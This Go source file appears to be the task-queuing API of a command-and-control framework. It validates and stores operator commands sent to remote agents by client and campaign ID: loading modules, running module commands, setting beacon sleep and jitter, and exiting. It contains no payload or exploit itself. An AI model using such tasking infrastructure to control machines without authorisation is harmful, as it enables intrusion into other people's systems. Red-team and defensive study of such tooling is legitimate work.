package tasks

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	authmgr "styx/internal/auth"
	"styx/internal/db"
	"styx/internal/modules"
	"styx/internal/packager"

	"github.com/go-chi/chi"
)

type API struct {
	db      *db.DB
	auth    *authmgr.Auth
	modules *modules.Registry
}

func New(database *db.DB, a *authmgr.Auth, m *modules.Registry) *API {
	return &API{db: database, auth: a, modules: m}
}

func (a *API) Routes() chi.Router {
	r := chi.NewRouter()
	r.Use(a.auth.AuthWare())
	r.Post("/new", a.NewTask)
	return r
}

func (a *API) NewTask(w http.ResponseWriter, r *http.Request) {
	var req db.NewTaskReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	if req.Cmd == "" || req.ClientID <= 0 || req.CampaignID == "" {
		writeError(w, http.StatusBadRequest, "cmd, client_id and campaign_id are required")
		return
	}
	if err := a.resolve(&req); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	if req.Kind == "help" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"help": "help, load-module <name>, unload-module <name>, list-modules, run-command <module> <command> [args], reconfig <sleep> <jitter>, exit <thread|process>"})
		return
	}

	taskID, err := a.db.InsertTask(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int32{"task_id": taskID})
}

func (a *API) resolve(req *db.NewTaskReq) error {
	switch req.Cmd {
	case "help":
		req.Kind = "help"
	case "load-module", "unload-module":
		if len(req.Args) != 1 {
			return fmt.Errorf("%s requires exactly one module name", req.Cmd)
		}
		name, ok := stringArg(req.Args, 0)
		if !ok {
			return fmt.Errorf("%s requires a module name", req.Cmd)
		}
		module, ok := a.modules.Module(name)
		if !ok {
			return fmt.Errorf("unknown module %q", name)
		}
		moduleID := int32(module.ID)
		req.Kind = req.Cmd
		req.Module = name
		req.ModuleID = &moduleID
	case "list-modules":
		if len(req.Args) != 0 {
			return fmt.Errorf("list-modules takes no arguments")
		}
		req.Kind = "list-modules"
	case "reconfig":
		if len(req.Args) != 2 {
			return fmt.Errorf("reconfig requires sleep and jitter")
		}
		sleep, ok := intArg(req.Args, 0)
		if !ok {
			return fmt.Errorf("reconfig sleep must be an int32")
		}
		jitter, ok := intArg(req.Args, 1)
		if !ok {
			return fmt.Errorf("reconfig jitter must be an int32")
		}
		req.Kind = "reconfig"
		req.Args = []db.Arg{
			{Type: "int32", Value: sleep},
			{Type: "int32", Value: jitter},
		}
	case "exit":
		if len(req.Args) != 1 {
			return fmt.Errorf("exit requires exactly one argument: thread or process")
		}
		target, ok := stringArg(req.Args, 0)
		if !ok {
			return fmt.Errorf("exit requires thread or process")
		}
		var exitType int32
		switch strings.ToLower(target) {
		case "process":
			exitType = packager.EXIT_PROCESS
		case "thread":
			exitType = packager.EXIT_THREAD
		default:
			return fmt.Errorf("exit target must be thread or process")
		}
		req.Kind = "exit-agent"
		req.Code = &exitType
	case "run-command":
		moduleName, ok := stringArg(req.Args, 0)
		if !ok {
			return fmt.Errorf("run-command requires a module name")
		}
		command, ok := stringArg(req.Args, 1)
		if !ok {
			return fmt.Errorf("run-command requires a command")
		}
		module, ok := a.modules.Module(moduleName)
		if !ok {
			return fmt.Errorf("unknown module %q", moduleName)
		}
		commandDef, ok := module.Commands[command]
		if !ok {
			return fmt.Errorf("unknown command %q in module %q", command, moduleName)
		}
		args, err := validateArgs(req.Args[2:], commandDef.Args)
		if err != nil {
			return fmt.Errorf("%s: %w", command, err)
		}
		moduleID := int32(module.ID)
		commandCode := int32(commandDef.Code)
		req.Kind = "run-command"
		req.Module = moduleName
		req.ModuleID = &moduleID
		req.Command = command
		req.Code = &commandCode
		req.Args = args
	default:
		moduleName, module, _, ok := a.modules.ResolveCommand(req.Cmd)
		if !ok {
			return fmt.Errorf("unknown command %q", req.Cmd)
		}
		commandDef, ok := module.Commands[req.Cmd]
		if !ok {
			return fmt.Errorf("unknown command %q", req.Cmd)
		}
		args, err := validateArgs(req.Args, commandDef.Args)
		if err != nil {
			return fmt.Errorf("%s: %w", req.Cmd, err)
		}
		moduleID := int32(module.ID)
		commandCode := int32(commandDef.Code)
		req.Kind = "run-command"
		req.Module = moduleName
		req.ModuleID = &moduleID
		req.Command = req.Cmd
		req.Code = &commandCode
		req.Args = args
	}
	return nil
}

func stringArg(args []db.Arg, index int) (string, bool) {
	if index < 0 || index >= len(args) {
		return "", false
	}
	value, ok := args[index].Value.(string)
	if !ok || value == "" {
		return "", false
	}
	return value, true
}

func intArg(args []db.Arg, index int) (int32, bool) {
	if index < 0 || index >= len(args) {
		return 0, false
	}
	value, ok := parseInt64(args[index].Value)
	if !ok {
		text, isString := args[index].Value.(string)
		if !isString {
			return 0, false
		}
		parsed, err := strconv.ParseInt(text, 10, 32)
		if err != nil {
			return 0, false
		}
		return int32(parsed), true
	}
	if value < -1<<31 || value > 1<<31-1 {
		return 0, false
	}
	return int32(value), true
}

func validateArgs(args []db.Arg, schema []modules.CommandArg) ([]db.Arg, error) {
	if schema == nil {
		return args, nil
	}
	if len(args) > len(schema) {
		return nil, fmt.Errorf("expected at most %d argument(s), got %d", len(schema), len(args))
	}
	validated := make([]db.Arg, 0, len(schema))
	for index, spec := range schema {
		if index < len(args) {
			if err := validateArg(args[index], spec); err != nil {
				return nil, err
			}
			validated = append(validated, args[index])
			continue
		}
		if spec.Required {
			return nil, fmt.Errorf("missing argument: %s", spec.Name)
		}
		if spec.Default != nil {
			validated = append(validated, db.Arg{Type: spec.Type, Value: spec.Default})
		}
	}
	return validated, nil
}

func validateArg(arg db.Arg, spec modules.CommandArg) error {
	switch spec.Type {
	case "", "string":
		if arg.Type != "" && arg.Type != "string" {
			return fmt.Errorf("argument %q expects string, got %q", spec.Name, arg.Type)
		}
		if _, ok := arg.Value.(string); !ok {
			return fmt.Errorf("argument %q expects string", spec.Name)
		}
	case "int", "int32", "integer":
		if arg.Type != "" && arg.Type != "int" && arg.Type != "int32" && arg.Type != "integer" {
			return fmt.Errorf("argument %q expects int32, got %q", spec.Name, arg.Type)
		}
		if _, ok := parseInt64(arg.Value); !ok {
			return fmt.Errorf("argument %q expects int32", spec.Name)
		}
	case "bool", "boolean":
		if arg.Type != "" && arg.Type != "bool" && arg.Type != "boolean" {
			return fmt.Errorf("argument %q expects bool, got %q", spec.Name, arg.Type)
		}
		if _, ok := arg.Value.(bool); !ok {
			return fmt.Errorf("argument %q expects bool", spec.Name)
		}
	default:
		return fmt.Errorf("argument %q has unsupported type %q", spec.Name, spec.Type)
	}
	return nil
}

func parseInt64(value any) (int64, bool) {
	switch number := value.(type) {
	case int:
		return int64(number), true
	case int32:
		return int64(number), true
	case int64:
		return number, true
	case float64:
		converted := int64(number)
		if float64(converted) != number {
			return 0, false
		}
		return converted, true
	case json.Number:
		parsed, err := number.Int64()
		return parsed, err == nil
	default:
		return 0, false
	}
}

func writeError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}
